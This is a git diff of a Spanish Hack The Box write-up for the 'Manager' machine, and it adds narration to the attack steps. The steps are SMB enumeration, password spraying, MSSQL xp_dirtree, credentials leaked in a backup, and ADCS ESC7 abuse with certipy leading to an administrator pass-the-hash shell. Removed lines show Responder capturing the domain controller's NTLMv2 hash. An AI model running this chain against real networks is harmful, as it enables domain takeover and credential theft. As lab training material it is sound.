@@ -104,15 +104,15 @@ Nmap done: 1 IP address (1 host up) scanned in 127.52 seconds
 
 ## Website
 
+La pagina principal es estática 
 ![image-center](/assets/images/Pasted image 20260102154657.png)
-```bash
-nxc smb manager.htb -u '' -p '' --shares                                       
-SMB         10.129.237.117  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False) 
-SMB         10.129.237.117  445    DC01             [+] manager.htb\: 
-SMB         10.129.237.117  445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED
-                                                                                                                                                                                            
-┌──(root㉿kali)-[/home/zs1n/Desktop/htb/manager]
-└─# nxc smb manager.htb -u 'guest' -p '' --shares
+
+## SMB
+
+Como el usuario `guest` esta habilitado enumere `shares`.
+
+```bash     
+nxc smb manager.htb -u 'guest' -p '' --shares
 SMB         10.129.237.117  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False) 
 SMB         10.129.237.117  445    DC01             [+] manager.htb\guest: 
 SMB         10.129.237.117  445    DC01             [*] Enumerated shares
@@ -124,6 +124,9 @@ SMB         10.129.237.117  445    DC01             IPC$            READ        
 SMB         10.129.237.117  445    DC01             NETLOGON                        Logon server share 
 SMB         10.129.237.117  445    DC01             SYSVOL                          Logon server share 
 ```
+### Valid users
+
+Nada interesante en ellos, así que con el parámetro `--rid-brute` enumere usuarios validos del dominio.
 
 ```bash
 nxc smb manager.htb -u 'guest' -p '' --rid-brute
@@ -161,13 +164,16 @@ SMB         10.129.237.117  445    DC01             1116: MANAGER\Raven (SidType
 SMB         10.129.237.117  445    DC01             1117: MANAGER\JinWoo (SidTypeUser)
 SMB         10.129.237.117  445    DC01             1118: MANAGER\ChinHae (SidTypeUser)
 SMB         10.129.237.117  445    DC01             1119: MANAGER\Operator (SidTypeUser)
-
 ```
+
+Con este output, ejecute el siguiente comando para solo agregar al archivo `users` los usuarios.
 
 ```bash
 cat users| grep "TypeUser" | awk '{print $6}' | tr '\\' " "  | awk '{print $NF}' | sponge users 
 ```
+### Kerberoasting fail
 
+Al realizar un `Kerberoasting attack` no vi nada de nada, solo algunos tickets TGS pero son incrackeables ya que pertenecen al usuario maquina `(DC01$)` y a `krbtgt` los cuales son usuarios que por defecto tienen passwords muy seguras y largas.
 ```bash
 impacket-GetUserSPNs manager.htb/guest -request -usersfile users -dc-ip 10.129.237.117 -no-pass
 Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies 
@@ -185,85 +191,27 @@ $krb5tgs$18$DC01$$MANAGER.HTB$*DC01$*$eee64c584988592b008fb830$09c6ba93d00264528
 [-] Principal: ChinHae - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
 [-] Principal: Operator - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
 ```
+### Password spraying
+
+Con las misma lista de usuarios cree una en minuscula de passwords, con los mismos nombres.
 
 ```bash
 cat users | tr 'A-Z' 'a-z' > passwords
 ```
 
+Y me dio una coincidencia.
+
 ```bash
 nxc smb manager.htb -u users -p passwords
 SMB         10.129.237.117  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False) 
 SMB         10.129.237.117  445    DC01             [-] manager.htb\Zhong:zhong STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\Cheng:zhong STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\Ryan:zhong STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\Raven:zhong STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\JinWoo:zhong STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\ChinHae:zhong STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\Operator:zhong STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\Zhong:cheng STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\Cheng:cheng STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\Ryan:cheng STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\Raven:cheng STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\JinWoo:cheng STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\ChinHae:cheng STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\Operator:cheng STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\Zhong:ryan STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\Cheng:ryan STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\Ryan:ryan STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\Raven:ryan STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\JinWoo:ryan STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\ChinHae:ryan STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\Operator:ryan STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\Zhong:raven STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\Cheng:raven STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\Ryan:raven STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\Raven:raven STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\JinWoo:raven STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\ChinHae:raven STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\Operator:raven STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\Zhong:jinwoo STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\Cheng:jinwoo STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\Ryan:jinwoo STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\Raven:jinwoo STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\JinWoo:jinwoo STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\ChinHae:jinwoo STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\Operator:jinwoo STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\Zhong:chinhae STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\Cheng:chinhae STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\Ryan:chinhae STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\Raven:chinhae STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\JinWoo:chinhae STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\ChinHae:chinhae STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\Operator:chinhae STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\Zhong:operator STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\Cheng:operator STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\Ryan:operator STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\Raven:operator STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\JinWoo:operator STATUS_LOGON_FAILURE 
-SMB         10.129.237.117  445    DC01             [-] manager.htb\ChinHae:operator STATUS_LOGON_FAILURE 
+<SNIP>
 SMB         10.129.237.117  445    DC01             [+] manager.htb\Operator:operator 
 ```
+## Shell as raven
+### MSSQL as operator
 
-```bash
- bloodhound-python -c all -u Operator -p 'operator' -d manager.htb -ns 10.129.237.117 
-INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
-INFO: Found AD domain: manager.htb
-INFO: Getting TGT for user
-INFO: Connecting to LDAP server: dc01.manager.htb
-INFO: Found 1 domains
-INFO: Found 1 domains in the forest
-INFO: Found 1 computers
-INFO: Connecting to LDAP server: dc01.manager.htb
-INFO: Found 11 users
-INFO: Found 53 groups
-INFO: Found 2 gpos
-INFO: Found 1 ous
-INFO: Found 19 containers
-INFO: Found 0 trusts
-INFO: Starting computer enumeration with 10 workers
-INFO: Querying computer: dc01.manager.htb
-INFO: Done in 01M 18S
-```
+Con las credenciales del usuario `operator` me conecte a la base de datos de Microsoft `(MSSQL)`.
 
 ```bash
 impacket-mssqlclient manager.htb/Operator:operator@dc01.manager.htb -dc-ip 10.129.237.117 -windows-auth
@@ -277,129 +225,28 @@ Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its a
 [*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
 [*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
 [!] Press help for extra shell commands
-SQL (MANAGER\Operator  guest@master)> xp_cmdshell whoami
-ERROR(DC01\SQLEXPRESS): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
-SQL (MANAGER\Operator  guest@master)> enum_dbs
-ERROR(DC01\SQLEXPRESS): Line 1: Could not find stored procedure 'enum_dbs'.
-SQL (MANAGER\Operator  guest@master)> help
-
-    lcd {path}                 - changes the current local directory to {path}
-    exit                       - terminates the server process (and this session)
-    enable_xp_cmdshell         - you know what it means
-    disable_xp_cmdshell        - you know what it means
-    enum_db                    - enum databases
-    enum_links                 - enum linked servers
-    enum_impersonate           - check logins that can be impersonated
-    enum_logins                - enum login users
-    enum_users                 - enum current db users
-    enum_owner                 - enum db owner
-    exec_as_user {user}        - impersonate with execute as user
-    exec_as_login {login}      - impersonate with execute as login
-    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
-    xp_dirtree {path}          - executes xp_dirtree on the path
-    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
-    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
-    ! {cmd}                    - executes a local shell cmd
-    upload {from} {to}         - uploads file {from} to the SQLServer host {to}
-    download {from} {to}       - downloads file from the SQLServer host {from} to {to}
-    show_query                 - show query
-    mask_query                 - mask query
-    
-SQL (MANAGER\Operator  guest@master)> enum_db
-name     is_trustworthy_on   
-------   -----------------   
-master                   0   
-tempdb                   0   
-model                    0   
-msdb                     1   
-SQL (MANAGER\Operator  guest@master)> exec_as_login sa
-ERROR(DC01\SQLEXPRESS): Line 1: Cannot execute as the server principal because the principal "sa" does not exist, this type of principal cannot be impersonated, or you do not have permission.
-SQL (MANAGER\Operator  guest@master)> enum_owner
-Database   Owner   
---------   -----   
-master     sa      
-tempdb     sa      
-model      sa      
-msdb       sa      
-SQL (MANAGER\Operator  guest@master)> xp_dirtree \\10.10.17.19\whoami
-subdirectory   depth   file   
-------------   -----   ----
+SQL (MANAGER\Operator  guest@master)>
 ```
+### Backup file
 
+Con la funcion `xp_dirtree` del propio mssql, pude listar el contenido de los directorios de la maquina, donde en el directorio donde corre la pagina web, encontre un archivo backup.
 
 ```bash
- responder -I tun0
-                                         __
-  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
-  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
-  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
-                   |__|
-
-
-[+] Poisoners:
-    LLMNR                      [ON]
-    NBT-NS                     [ON]
-    MDNS                       [ON]
-    DNS                        [ON]
-    DHCP                       [OFF]
-
-[+] Servers:
-    HTTP server                [ON]
-    HTTPS server               [ON]
-    WPAD proxy                 [OFF]
-    Auth proxy                 [OFF]
-    SMB server                 [ON]
-    Kerberos server            [ON]
-    SQL server                 [ON]
-    FTP server                 [ON]
-    IMAP server                [ON]
-    POP3 server                [ON]
-    SMTP server                [ON]
-    DNS server                 [ON]
-    LDAP server                [ON]
-    MQTT server                [ON]
-    RDP server                 [ON]
-    DCE-RPC server             [ON]
-    WinRM server               [ON]
-    SNMP server                [ON]
-
-[+] HTTP Options:
-    Always serving EXE         [OFF]
-    Serving EXE                [OFF]
-    Serving HTML               [OFF]
-    Upstream Proxy             [OFF]
-
-[+] Poisoning Options:
-    Analyze Mode               [OFF]
-    Force WPAD auth            [OFF]
-    Force Basic Auth           [OFF]
-    Force LM downgrade         [OFF]
-    Force ESS downgrade        [OFF]
-
-[+] Generic Options:
-    Responder NIC              [tun0]
-    Responder IP               [10.10.17.19]
-    Responder IPv6             [dead:beef:4::1111]
-    Challenge set              [random]
-    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
-    Don't Respond To MDNS TLD  ['_DOSVC']
-    TTL for poisoned response  [default]
-
-[+] Current Session Variables:
-    Responder Machine Name     [WIN-N7UM4JI3CRM]
-    Responder Domain Name      [SU08.LOCAL]
-    Responder DCE-RPC Port     [48194]
-
-[*] Version: Responder 3.1.7.0
-[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
-[*] To sponsor Responder: https://paypal.me/PythonResponder
-
-[+] Listening for events...                                                                                                                                                                 
-
-[SMB] NTLMv2-SSP Client   : 10.129.237.117
-[SMB] NTLMv2-SSP Username : MANAGER\DC01$
-[SMB] NTLMv2-SSP Hash     : DC01$::MANAGER:1f8e5101430e7d2b:F2D7A4F0581CAD8357B50D2E54EF2EA5:010100000000000000A05F9D2B7CDC017BF85465C8C1E1320000000002000800530055003000380001001E00570049004E002D004E00370055004D0034004A0049003300430052004D0004003400570049004E002D004E00370055004D0034004A0049003300430052004D002E0053005500300038002E004C004F00430041004C000300140053005500300038002E004C004F00430041004C000500140053005500300038002E004C004F00430041004C000700080000A05F9D2B7CDC0106000400020000000800300030000000000000000000000000300000E023BF9C74EFAD92EE08A467BAE5BBB0F56081617C544CE1322E99138F19C78A0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310037002E00310039000000000000000000
+SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\inetpub\wwwroot
+subdirectory                      depth   file   
+-------------------------------   -----   ----   
+about.html                            1      1
+contact.html                          1      1   
+css                                   1      0   
+images                                1      0   
+index.html                            1      1   
+js                                    1      0   
+service.html                          1      1   
+web.config                            1      1   
+website-backup-27-07-23-old.zip       1      1  
 ```
+
+Con `wget` me lo descargue.
 
 ```bash
 wget http://manager.htb/website-backup-27-07-23-old.zip
@@ -413,48 +260,20 @@ Saving to: ‘website-backup-27-07-23-old.zip’
 website-backup-27-07-23-old.zip                100%[====================================================================================================>]   1021K   127KB/s    in 10s     
 
 2026-01-02 21:32:16 (102 KB/s) - ‘website-backup-27-07-23-old.zip’ saved [1045328/1045328]
+```
 
-                                                                                                                                                                                            
-┌──(root㉿kali)-[/home/zs1n/Desktop/htb/manager]
-└─# unzip website-backup-27-07-23-old.zip 
+Y con `unzip` lo descomprimí.
+
+```bash
+unzip website-backup-27-07-23-old.zip 
 Archive:  website-backup-27-07-23-old.zip
   inflating: .old-conf.xml           
   inflating: about.html              
-  inflating: contact.html            
-  inflating: css/bootstrap.css       
-  inflating: css/responsive.css      
-  inflating: css/style.css           
-  inflating: css/style.css.map       
-  inflating: css/style.scss          
-  inflating: images/about-img.png    
-  inflating: images/body_bg.jpg      
- extracting: images/call.png         
- extracting: images/call-o.png       
-  inflating: images/client.jpg       
-  inflating: images/contact-img.jpg  
- extracting: images/envelope.png     
- extracting: images/envelope-o.png   
-  inflating: images/hero-bg.jpg      
- extracting: images/location.png     
- extracting: images/location-o.png   
- extracting: images/logo.png         
-  inflating: images/menu.png         
- extracting: images/next.png         
- extracting: images/next-white.png   
-  inflating: images/offer-img.jpg    
-  inflating: images/prev.png         
- extracting: images/prev-white.png   
- extracting: images/quote.png        
- extracting: images/s-1.png          
- extracting: images/s-2.png          
- extracting: images/s-3.png          
- extracting: images/s-4.png          
- extracting: images/search-icon.png  
-  inflating: index.html              
-  inflating: js/bootstrap.js         
-  inflating: js/jquery-3.4.1.min.js  
-  inflating: service.html       
+<SNIP>       
 ```
+### Credentials
+
+Y viendo el contenido del archivo oculto, vi las credenciales del usuario `raven`.
 
 ```xml
 cat .old-conf.xml                     
@@ -480,19 +299,24 @@ cat .old-conf.xml
 </ldap-conf>
 
 ```
+### Auth
+
+Y con `evil-winrm` me conecte a la maquina.
 
 ```powershell
-                                    
-Evil-WinRM shell v3.9
-                                        
-Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
-                                        
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-                                        
+evil-winrm -i manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123'
+
+Evil-WinRM shell v3.4
+
 Info: Establishing connection to remote endpoint
+
 *Evil-WinRM* PS C:\Users\Raven\Documents> type ../desktop/user.txt
 ba7809e87a02170bfd7a57c5edaeeae3
 ```
+## Shell as administrator
+### ADCS Enumeration
+
+Con las credenciales de este usuario enumere plantillas vulnerables de las cuales pueda abusar.
 
 ```bash
 certipy find -dc-ip 10.129.237.117 -target dc01.manager.htb -enabled -vulnerable -stdout -u raven -p 'R4v3nBe5tD3veloP3r!123' 
@@ -548,8 +372,10 @@ Certificate Authorities
     [!] Vulnerabilities
       ESC7                              : User has dangerous permissions.
 Certificate Templates                   : [!] Could not find any certificate templates
-
 ```
+### ESC7 Abuse
+
+Primero agregue un nuevo miembro para poder después, `habilitar`, `aceptar` o `denegar` solicitudes de pendientes de `aprobacion` para los certificados que se `solicitan`.
 
 ```BASH
  certipy ca \
@@ -561,6 +387,8 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [*] Successfully added officer 'Raven' on 'manager-DC01-CA'
 ```
 
+Luego con los permisos de `ManagerCA`, habilito `SubCA`.
+
 ```bash
 certipy ca \
     -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' \
@@ -571,7 +399,9 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
 
 ```
+### Get administrator SID
 
+Para el siguiente paso necesito el `SID` del usuario `administrator`.
 
 ```POWERSHELL
 *Evil-WinRM* PS C:\Users\Raven\Documents> Get-ADUser -Identity administrator | select Name,SID
@@ -581,6 +411,8 @@ Name          SID
 Administrator S-1-5-21-4078382237-1492182817-2568127209-500
 
 ```
+
+Después solicito un certificado usando la plantilla `SubCA`, de manera que va a fallar.
 
 ```bash
 certipy req \
@@ -597,6 +429,9 @@ Would you like to save the private key? (y/N): y
 [*] Wrote private key to '19.key'
 [-] Failed to request certificate
 ```
+### Approve the pending request
+
+Luego prestando atención al `ID` de la solicitud, puedo pasar, debido a que tengo los permisos adecuados, `aceptar` la solicitud.
 
 ```bash
  certipy ca \
@@ -607,6 +442,8 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
 [*] Successfully issued certificate request ID 19
 ```
+
+Y ahora que la solicitud la acepte, puedo volver a solicitar el certificado, usando el mismo `ID` con el que aprobé la solicitud.
 
 ```bash
 certipy req \
@@ -623,6 +460,9 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [*] Saving certificate and private key to 'administrator.pfx'
 [*] Wrote certificate and private key to 'administrator.pfx'
 ```
+### NTLM Hash
+
+Usando el mismo, me autentico contra el dominio para poder obtener el hash NT, del usuario `Administrator`.
 
 ```bash
 certipy auth -pfx 'administrator.pfx' -dc-ip '10.129.237.117'
@@ -640,6 +480,9 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [*] Trying to retrieve NT hash for 'administrator'
 [*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
 ```
+### Shell
+
+Y usando el mismo, puedo realizar la conexión con `evil-winrm`.
 
 ```powershell
 evil-winrm -i manager.htb -u administrator -H ae5064c2f62317332c88629e025924ef                           
